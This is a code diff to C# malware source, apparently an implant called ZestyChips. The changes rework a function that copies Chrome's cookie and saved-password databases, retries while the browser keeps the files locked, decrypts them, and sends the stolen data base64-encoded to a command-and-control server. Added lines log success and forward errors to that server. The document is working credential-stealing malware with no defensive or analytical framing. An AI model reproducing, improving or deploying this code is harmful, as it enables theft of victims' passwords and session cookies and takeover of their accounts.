@@ -40,44 +40,62 @@ namespace ZestyChips
         */
         private static string StealChromeData(string path, string fileSaveName) {
             bool hasChromeCookies = !File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + path);
-            string result;
+            string result = string.Empty;
 
             if (hasChromeCookies) {
                 result = "Chrome not found";
-                return result;
             } else {
-                Helpers.PrintInfo("Chrome found, copying..");
-                for(;;) {
-                    // steal chrome cookies
-                    try {
-                        // copy file to dest file name
-                        File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + path, fileSaveName, true);
-                        break;
-                    } catch (Exception ex) {
-                        // exception will throw most likely if chrome is open
-                        // implant will continually run until chrome is closed / process terminated
-                        Helpers.PrintInfo("an error occurred copying cache: " + ex.Message);
-                        Thread.Sleep(10000); // sleep 10 seconds
+                try {
+                    for(;;) {
+                        // steal chrome cookies
+                        try {
+                            // copy file to dest file name
+                            File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + path, fileSaveName, true);
+                            break;
+                        } catch (Exception ex) {
+                            // exception will throw most likely if chrome is open
+                            // implant will continually run until chrome is closed / process terminated
+                            Helpers.PrintInfo("an error occurred copying cache: " + ex.Message);
+                            Thread.Sleep(10000); // sleep 10 seconds
+                        }
                     }
-                }
 
-                string data;
-                switch (fileSaveName) {
-                    case "cc":
-                        data = DecryptChromeCookies(fileSaveName);
-                        Program.SendBase64EncodedData(data); // send data off to c2
-                        return data;
+                    switch (fileSaveName) {
+                        case "cc":
+                            result = DecryptChromeCookies(fileSaveName);
+                            Program.SendBase64EncodedData(result); // send data off to c2
+                            Helpers.PrintSuccess("chrome cookies stolen and sent to c2.");
+                            break;
+                        
+                        case "p":
+                            result = DecryptChromePasswords(fileSaveName);
+                            Program.SendBase64EncodedData(result); // send data off to c2
+                            Helpers.PrintSuccess("chrome passwords stolen and sent to c2.");
+                            break;
+
+                        default:
+                            result = "stealer error";
+                            break;
+                    }
+                } catch (Exception ex) {
+                    Helpers.PrintFail($"An error occurred: {ex.Message}");
+                    Program.SendBase64EncodedData($"[-] an error occurred during the stealing process for file {fileSaveName}. Error: {ex.Message}\n");
+                } finally {
+                    // clean up the temp file
+                    // currently not deleting the saved temp file, a handle is being kept alive, cannot close the handles correctly in the respective functions.
+                    // todo
+                    try {
+                        if (File.Exists(fileSaveName)) {
+                            File.Delete(fileSaveName);
+                        }
+                    } catch(Exception ex) {
+                        // Helpers.PrintFail($"Failed to delete file: {fileSaveName}, error: {ex.Message}");
+                    }
                     
-                    case "p":
-                        data = DecryptChromePasswords(fileSaveName);
-                        Program.SendBase64EncodedData(data); // send data off to c2
-                        return data;
-
-                    default:
-                        return "error in StealChromeData";
                 }
-                
             }
+
+            return result;
         }
         
         /*
@@ -175,6 +193,10 @@ namespace ZestyChips
                     }        
                 }
             }
+
+            // cleanup
+            // sqliteConnection.Close();
+            // sdr.Close();
 
             // if we have caught any errors above and have appended to the list
             // just return that list, it will be incomplete overall, but hopefully this 
@@ -314,13 +336,19 @@ namespace ZestyChips
                             }
                             catch (Exception ex) {
                                 Helpers.PrintFail($"failed to decrypt data: {ex}");
+                                // memoryStream.Close();
                                 return "Error decrypting chrome data";
                             }
                         }
                     }
+                    // memoryStream.Close();
                 }
 
             }
+
+            // cleanup
+            // sqliteConnection.Close();
+            // sdr.Close();
 
             // serialise to JSON and ret
             return JsonSerializer.Serialize(masterDictionary);
